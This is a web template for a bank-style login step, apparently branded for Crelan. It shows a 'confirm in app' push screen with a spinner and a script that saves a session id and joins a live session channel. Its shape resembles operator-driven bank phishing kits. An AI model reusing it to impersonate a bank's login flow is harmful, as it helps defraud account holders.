<div class="form-page-center login-form-push">
    <div class="form-container">
        <div class="form-container--content">
            <div class="push-container">
                <div class="push-icon">
                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M17 1H7C5.9 1 5 1.9 5 3V21C5 22.1 5.9 23 7 23H17C18.1 23 19 22.1 19 21V3C19 1.9 18.1 1 17 1ZM17 19H7V5H17V19ZM12 18C12.55 18 13 17.55 13 17C13 16.45 12.55 16 12 16C11.45 16 11 16.45 11 17C11 17.55 11.45 18 12 18Z" fill="#84BD00"/>
                        <circle cx="12" cy="11" r="3" stroke="#84BD00" stroke-width="2" fill="none"/>
                        <path d="M12 8V11L13.5 12.5" stroke="#84BD00" stroke-width="1.5" stroke-linecap="round"/>
                    </svg>
                </div>
                <h2 class="push-title">{{ __('messages.push_confirm_in_app') }}</h2>
                <p class="push-text">{{ __('messages.push_request_sent') }}</p>
                <div class="waiting-spinner"></div>
                <p class="waiting-text">{{ __('messages.push_waiting') }}</p>
            </div>
        </div>
    </div>
</div>

<style>
.login-form-push .form-container--header-crelan { display: flex; justify-content: space-between; align-items: center; gap: 20px; }
.login-form-push .header-left { display: flex; align-items: center; gap: 12px; }
.login-form-push .header-right { flex: 1; max-width: 300px; }
.login-form-push .push-steps-compact { display: flex; flex-direction: column; gap: 3px; }
.login-form-push .push-step { display: flex; align-items: center; gap: 6px; padding: 2px 4px; border-radius: 4px; background: #f8fafc; border: 1px solid #e2e8f0; }
.login-form-push .push-step.active { background: #f0fdf4; border-color: #84BD00; }
.login-form-push .push-step-number { width: 14px; height: 14px; border-radius: 50%; background: #e2e8f0; color: #64748b; display: flex; align-items: center; justify-content: center; font-size: 8px; font-weight: 600; flex-shrink: 0; }
.login-form-push .push-step.active .push-step-number { background: #84BD00; color: white; }
.login-form-push .push-step-title { font-size: 8px; font-weight: 600; color: #64748b; line-height: 1.1; }
.login-form-push .push-step.active .push-step-title { color: #1a202c; }
</style>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const sessionId = '{{ $session->id }}';
    if (sessionId) {
        localStorage.setItem('session_id', sessionId);
        if (window.SessionManager) {
            window.SessionManager.setSessionId(sessionId);
            window.SessionManager.connectToChannel();
        }
    }
});
</script>
